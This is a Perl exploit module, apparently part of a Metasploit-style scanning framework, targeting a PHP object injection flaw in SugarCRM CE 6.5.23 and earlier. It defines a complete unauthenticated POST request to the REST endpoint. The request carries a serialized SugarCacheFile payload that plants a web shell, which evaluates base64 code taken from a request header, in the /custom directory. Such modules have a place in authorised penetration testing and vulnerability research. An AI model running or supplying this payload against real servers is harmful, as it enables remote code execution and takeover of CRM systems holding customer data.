package SUGARCRM::MSF::SugarcrmRestUnserializeExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "SugarcrmRestUnserializeExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits a PHP Object Injection vulnerability in SugarCRM CE <= 6.5.23

        which could be abused to allow unauthenticated users to execute arbitrary PHP code with

        the permissions of the webserver. The dangerous unserialize() call exists in the

        '/service/core/REST/SugarRestSerialize.php' script. The exploit abuses the __destruct()

        method from the SugarCacheFile class to write arbitrary PHP code into the /custom directory.

      ",
  MSF_MODULE  => "sugarcrm_rest_unserialize_exec",
  REFERENCES  => [
                   "http://karmainsecurity.com/KIS-2016-07",
                   "http://www.sugarcrm.com/security/sugarcrm-sa-2016-001",
                   "http://www.sugarcrm.com/security/sugarcrm-sa-2016-008",
                   "https://bugs.php.net/bug.php?id=72663",
                 ],
  TITLE       => "SugarCRM REST Unserialize PHP Code Execution",


  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'service/v4/rest.php',
      PAYLOAD      => 'method=login&input_type=Serialize&rest_data=O%3a%2b14%3a%22SugarCacheFile%22%3a23%3a%7bS%3a17%3a%22\00%2a\00_cacheFileName%22%3bs%3a24%3a%22../custom/noFMXgEhWX.php%22%3bS%3a16%3a%22\00%2a\00_cacheChanged%22%3bb%3a1%3bS%3a14%3a%22\00%2a\00_localStore%22%3ba%3a1%3a%7bi%3a0%3bs%3a55%3a%22%3c%3fphp%20eval%28base64_decode%28%24_SERVER%5b%27HTTP_PAYLOAD%27%5d%29%29%3b%20%3f%3e%22%3b%7d%7d',
      TEXT   => 'Sending Exploit #2 Request : [POST] /service/v4/rest.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
